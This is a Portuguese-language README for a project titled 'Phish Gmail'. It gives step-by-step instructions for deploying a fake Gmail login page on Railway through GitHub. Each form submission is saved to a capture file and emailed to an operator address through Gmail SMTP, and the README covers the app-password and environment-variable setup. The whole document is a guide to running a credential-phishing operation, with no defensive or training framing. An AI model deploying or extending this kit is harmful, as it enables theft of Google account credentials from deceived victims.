# Phish Gmail — GitHub + Railway

## Como funciona
- `login.html` é servido estáticamente pelo Express.
- O POST em `/captura` grava em `capturas.txt` (Volume) e envia e-mail via Nodemailer.

## Setup no Railway

1. **Crie um repositório no GitHub** com estes arquivos.
2. No [Railway](https://railway.app), crie um novo projeto → "Deploy from GitHub repo".
3. Adicione um **Volume** montado em `/data` (para persistir `capturas.txt`).
4. Configure as **variáveis de ambiente**:

| Variável | Valor |
|----------|-------|
| `SMTP_HOST` | `smtp.gmail.com` |
| `SMTP_PORT` | `587` |
| `SMTP_SECURE` | `false` |
| `SMTP_USER` | `seu-email@gmail.com` |
| `SMTP_PASS` | `senha-de-app-do-gmail` |
| `RECEIVER_EMAIL` | `quem-va-receber@gmail.com` |

5. Deploy. A URL pública será algo como `https://phish-gmail.up.railway.app`.

## Senha de app do Gmail
1. Vá em https://myaccount.google.com/apppasswords
2. Crie uma senha de app (16 caracteres).
3. Use como `SMTP_PASS`.

## Verificar capturas
- Pelo e-mail (cada submissão gera uma mensagem).
- Ou acesse `GET /capturas` para ver o conteúdo do arquivo (adicione se quiser).
